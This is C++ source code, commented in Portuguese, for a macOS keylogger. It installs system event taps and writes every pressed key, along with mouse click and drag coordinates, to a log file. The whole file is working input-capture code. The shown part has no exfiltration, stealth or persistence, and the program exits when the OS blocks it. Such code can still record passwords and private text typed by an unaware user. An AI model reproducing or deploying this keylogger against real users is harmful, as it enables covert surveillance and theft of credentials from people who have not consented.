#include "Keylogger.h"
#include "Keyboard.h"
#include "Logger.h"
#include "Mouse.h"
#include <iostream>

// executa ao criar a thread
void Keylogger::operator()() {
    Logger *logger = Logger::instance();

    const char *header = "[[K] KEYLOGGER INITIALIZED]";
    logger->writeln(header);

    // Incializa os ouvintes
    initializeKeyboardTracker();
    initializeMouseTracker();

    logger->line();

    CFRunLoopRun();
}


/**
 * Registra o rastreador de eventos para o Teclado.
 * Todas teclas quando pressionadas (down e up)
 */
void Keylogger::initializeKeyboardTracker() {
    Logger *logger = Logger::instance();

    // Apenas ouvir os eventos, não modificar
    CGEventTapOptions tapOptions = kCGEventTapOptionListenOnly;

    // Ouvir apenas eventos de declado (quando pressionar uma tecla)
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));

    // Registra o evento de teclado
    CFMachPortRef keyboardEventTap = CGEventTapCreate(
            kCGSessionEventTap, kCGHeadInsertEventTap, tapOptions, eventMask, CGKeyboardInputEventCallback, NULL
    );

    // Se existir alguma restrição ao nosso programa por parte do SO, o evento não poderá ser registrado.
    if (!keyboardEventTap) {
        logger->writeln("[[ERROR] Cannot track Keyboard events!]");
        logger->writeln("[Tracking Keyboard events: NO]");
        exit(1);
    } else {
        logger->writeln("[Tracking Keyboard events: YES]");
    }

    // Obtem a referência do loop de execução do programa
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, keyboardEventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(keyboardEventTap, true);
}


/**
 * Registra o rastreador de eventos para Mouse.
 * Clique com Direito/Esquerdo  e  Arrastar
 */
void Keylogger::initializeMouseTracker() {
    Logger *logger = Logger::instance();

    // Apenas ouvir os eventos, não modificar **ainda**
    CGEventTapOptions tapOptions = kCGEventTapOptionListenOnly;

    // Ouvir eventos de mouse, clicar, e clicar e arrastar.
    CGEventMask eventMask = (
            CGEventMaskBit(kCGEventLeftMouseDown) | CGEventMaskBit(kCGEventLeftMouseDragged) |
                    CGEventMaskBit(kCGEventRightMouseDown) | CGEventMaskBit(kCGEventRightMouseDragged) |
                    CGEventMaskBit(kCGMouseEventClickState)
    );

    // Registra o evento de teclado
    CFMachPortRef mouseEventTap = CGEventTapCreate(
            kCGSessionEventTap, kCGHeadInsertEventTap, tapOptions, eventMask, CGMouseClickEventCallback, NULL
    );

    // Se existir alguma restrição ao nosso programa por parte do SO, o evento não poderá ser registrado.
    if (!mouseEventTap) {
        logger->writeln("[[ERROR] Cannot track Mouse events!]");
        logger->writeln("[Tracking Mouse events: NO]");
        exit(1);
    } else {
        logger->writeln("[Tracking Mouse events: YES]");
    }

    // Obtem a referência do loop de execução do programa
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, mouseEventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(mouseEventTap, true);
}





// ------------------------------------------------------------------------------------------------------------------------------- \\
// -----------------------------------------------------------   TECLADO   ------------------------------------------------------- \\
// ------------------------------------------------------------------------------------------------------------------------------- \\

/**
 * Registra no arquivo de log a tecla pressionada
 */
CGEventRef Keylogger::CGKeyboardInputEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    Logger *logger = Logger::instance();

    // Obtem a tecla pressionada
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    const char *parsedKey = Keyboard::convertKeyCode(keyCode);

    logger->write(parsedKey);

    return event;
}





// ------------------------------------------------------------------------------------------------------------------------------- \\
// ------------------------------------------------------------   MOUSE    ------------------------------------------------------- \\
// ------------------------------------------------------------------------------------------------------------------------------- \\

// Variavel de controle, para saber se o mouse esta sendo arrastado
bool is_dragging = false;
char *clickOnDragStart = (char *) malloc(15);

CGEventRef Keylogger::CGMouseClickEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    Logger *logger = Logger::instance();

    // Obtem as cordenadas do mouse
    CGPoint cursor = Mouse::getCursorPosition();

    // Prepara a string com o nome do botão do mouse que foi usado
    const char *parsedMouseEvent = Mouse::convertMouseEvent(type);

    // Se estiver CLICANDO e ARRASTANDO o mouse.
    if (type == kCGEventLeftMouseDragged || type == kCGEventRightMouseDragged || type == kCGEventOtherMouseDragged) {

        // Se começou a arrastar o mouse agora, salva as cordenadas iniciais
        if (!is_dragging) {

            strcpy(clickOnDragStart, parsedMouseEvent);

            logger->writeln("");
            logger->write("[d:");
            logger->write((float) cursor.x);
            logger->write("x");
            logger->write((float) cursor.y);

            // Marca a flag = "Ainda esta arrastando"
            is_dragging = true;
        } else {
            logger->write("|");
            logger->write((float) cursor.x);
            logger->write("x");
            logger->write((float) cursor.y);
        }

        // Se estiver apenas CLICANDO com o mouse
    } else {

        // Verifica se estava arrastando o mouse na ultima verificação do evento.
        // Neste ponto, se is_dragging é TRUE, significa que ele PAROU de CLICAR e ARRASTAR o mouse.
        if (is_dragging) {
            logger->write(clickOnDragStart);
            logger->write("]");
            logger->writeln("");

            // Resetamos a variavel de controle do DRAG.
            is_dragging = false;

            // TODO - Corrigir um problema aqui. Quando o mouse esta em DRAG, o final do bloco de registro de DRAG só é fechado no próximo clique do usuário. Podendo assim ter inconsistência em alguns blocos de DRAG, portanto, todo bloco drag, quebra linha no final
        }

        // Obter a quantidade de cliques feitos pelo usuario
        // 1/2/3... => Single/Double/Triple...
        int64_t clickStateCount = CGEventGetIntegerValueField(event, kCGMouseEventClickState);

        logger->write("[c:");
        logger->write((int) clickStateCount);
        logger->write(":");
        logger->write((float) cursor.x);
        logger->write("x");
        logger->write((float) cursor.y);
        logger->write(parsedMouseEvent);
        logger->write("]");
    }

    return event;
}


